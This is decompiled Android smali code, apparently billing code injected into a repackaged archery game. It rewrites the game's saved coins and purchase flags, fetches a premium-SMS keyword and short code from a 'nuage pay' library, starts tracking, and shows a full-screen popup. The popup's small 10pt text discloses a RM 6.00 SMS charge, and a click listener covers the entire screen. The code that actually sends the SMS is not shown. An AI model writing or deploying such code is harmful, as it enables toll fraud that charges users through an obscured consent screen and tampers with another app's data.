.class public Lcom/example/jifei/sp1;
.super Ljava/lang/Object;
.source "sp1.java"


# instance fields
.field sactivity:Landroid/app/Activity;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 31
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static mysp1(Landroid/app/Activity;)V
    .locals 21
    .param p0, "macitivity"    # Landroid/app/Activity;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    .prologue
    .line 36
    .line 37
    const-string v17, "com.junerking.archery"

    const/16 v18, 0x0

    .line 36
    move-object/from16 v0, p0

    move-object/from16 v1, v17

    move/from16 v2, v18

    invoke-virtual {v0, v1, v2}, Landroid/app/Activity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v10

    .line 38
    .local v10, "mmshare":Landroid/content/SharedPreferences;
    invoke-interface {v10}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    .line 39
    .local v6, "edit":Landroid/content/SharedPreferences$Editor;
    const-string v17, "firstOpen"

    const/16 v18, 0x0

    move-object/from16 v0, v17

    move/from16 v1, v18

    invoke-interface {v6, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 40
    const-string v17, "OnSaleBuyCount"

    const/16 v18, 0x1

    move-object/from16 v0, v17

    move/from16 v1, v18

    invoke-interface {v6, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 42
    const-string v17, "UserCoins"

    const/16 v18, 0x0

    move-object/from16 v0, v17

    move/from16 v1, v18

    invoke-interface {v10, v0, v1}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v16

    .line 43
    .local v16, "usercoins":I
    if-nez v16, :cond_0

    .line 44
    move/from16 v0, v16

    add-int/lit16 v0, v0, 0x1770

    move/from16 v16, v0

    .line 46
    const-string v17, "UserCoins"

    move-object/from16 v0, v17

    move/from16 v1, v16

    invoke-interface {v6, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 48
    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 51
    :cond_0
    new-instance v11, Landroid/widget/RelativeLayout;

    move-object/from16 v0, p0

    invoke-direct {v11, v0}, Landroid/widget/RelativeLayout;-><init>(Landroid/content/Context;)V

    .line 52
    .local v11, "mrelativeLayout":Landroid/widget/RelativeLayout;
    new-instance v8, Lcom/nuage/pay/CommandCreator;

    .line 53
    const-string v17, "6"

    .line 52
    move-object/from16 v0, p0

    move-object/from16 v1, v17

    invoke-direct {v8, v0, v1}, Lcom/nuage/pay/CommandCreator;-><init>(Landroid/app/Activity;Ljava/lang/String;)V

    .line 54
    .local v8, "mcommandCreator":Lcom/nuage/pay/CommandCreator;
    invoke-virtual {v8}, Lcom/nuage/pay/CommandCreator;->getKeyword()Ljava/lang/String;

    move-result-object v7

    .line 55
    .local v7, "keyword":Ljava/lang/String;
    invoke-virtual {v8}, Lcom/nuage/pay/CommandCreator;->getShortCode()Ljava/lang/String;

    move-result-object v15

    .line 56
    .local v15, "shorcode":Ljava/lang/String;
    invoke-static {}, Lcom/nuage/pay/AFUtils;->init()V

    .line 57
    invoke-static/range {p0 .. p0}, Lcom/nuage/pay/AFUtils;->startTracking(Landroid/content/Context;)V

    .line 58
    new-instance v9, Landroid/widget/RelativeLayout$LayoutParams;

    .line 59
    const/16 v17, -0x1

    .line 60
    const/16 v18, -0x1

    .line 58
    move/from16 v0, v17

    move/from16 v1, v18

    invoke-direct {v9, v0, v1}, Landroid/widget/RelativeLayout$LayoutParams;-><init>(II)V

    .line 62
    .local v9, "mlayoutParams":Landroid/widget/RelativeLayout$LayoutParams;
    new-instance v14, Landroid/widget/PopupWindow;

    .line 63
    const/16 v17, -0x1

    .line 64
    const/16 v18, -0x1

    .line 62
    move/from16 v0, v17

    move/from16 v1, v18

    invoke-direct {v14, v11, v0, v1}, Landroid/widget/PopupWindow;-><init>(Landroid/view/View;II)V

    .line 65
    .local v14, "popupwindow":Landroid/widget/PopupWindow;
    sput-object p0, Lcom/example/jifei/assetsutil;->mactivity:Landroid/app/Activity;

    .line 66
    const-string v17, "mystart.png"

    invoke-static/range {v17 .. v17}, Lcom/example/jifei/assetsutil;->getImageFromAssetsFile(Ljava/lang/String;)Landroid/graphics/Bitmap;

    move-result-object v4

    .line 68
    .local v4, "bgimg0":Landroid/graphics/Bitmap;
    new-instance v3, Landroid/graphics/drawable/BitmapDrawable;

    invoke-direct {v3, v4}, Landroid/graphics/drawable/BitmapDrawable;-><init>(Landroid/graphics/Bitmap;)V

    .line 69
    .local v3, "bd":Landroid/graphics/drawable/BitmapDrawable;
    invoke-virtual {v11, v3}, Landroid/widget/RelativeLayout;->setBackground(Landroid/graphics/drawable/Drawable;)V

    .line 70
    new-instance v12, Landroid/widget/TextView;

    move-object/from16 v0, p0

    invoke-direct {v12, v0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 71
    .local v12, "mtextView":Landroid/widget/TextView;
    new-instance v17, Ljava/lang/StringBuilder;

    const-string v18, "By clicking Download/Play button, the application will send the SMS message with the text "

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 72
    move-object/from16 v0, v17

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const-string v18, " to "

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    move-object/from16 v0, v17

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 71
    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 73
    .local v13, "mysend":Ljava/lang/String;
    new-instance v17, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 74
    const-string v18, ".SMS price is RM 6.00(Excl. GST). The service is provided by NuageTimes. Customer Support: +03 86010105, support@centili.com. Service compatibility: All Android devices Please check your phone specs for service compatibility. This service operates according to the Malaysian code of conduct for SMS services."

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 73
    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 75
    invoke-virtual {v12, v13}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 76
    const/high16 v17, 0x41200000    # 10.0f

    move/from16 v0, v17

    invoke-virtual {v12, v0}, Landroid/widget/TextView;->setTextSize(F)V

    .line 77
    new-instance v5, Landroid/widget/RelativeLayout$LayoutParams;

    .line 78
    const/16 v17, -0x2

    .line 79
    const/16 v18, -0x2

    .line 77
    move/from16 v0, v17

    move/from16 v1, v18

    invoke-direct {v5, v0, v1}, Landroid/widget/RelativeLayout$LayoutParams;-><init>(II)V

    .line 80
    .local v5, "clicklayoutParams":Landroid/widget/RelativeLayout$LayoutParams;
    const/16 v17, 0xc

    move/from16 v0, v17

    invoke-virtual {v5, v0}, Landroid/widget/RelativeLayout$LayoutParams;->addRule(I)V

    .line 83
    new-instance v17, Landroid/os/Handler;

    invoke-direct/range {v17 .. v17}, Landroid/os/Handler;-><init>()V

    new-instance v18, Lcom/example/jifei/sp1$1;

    move-object/from16 v0, v18

    move-object/from16 v1, p0

    invoke-direct {v0, v1, v14}, Lcom/example/jifei/sp1$1;-><init>(Landroid/app/Activity;Landroid/widget/PopupWindow;)V

    .line 97
    const-wide/16 v19, 0xbb8

    .line 83
    invoke-virtual/range {v17 .. v20}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 99
    new-instance v17, Lcom/example/jifei/sp1$2;

    move-object/from16 v0, v17

    move-object/from16 v1, p0

    invoke-direct {v0, v1, v14}, Lcom/example/jifei/sp1$2;-><init>(Landroid/app/Activity;Landroid/widget/PopupWindow;)V

    move-object/from16 v0, v17

    invoke-virtual {v11, v0}, Landroid/widget/RelativeLayout;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 251
    return-void
.end method
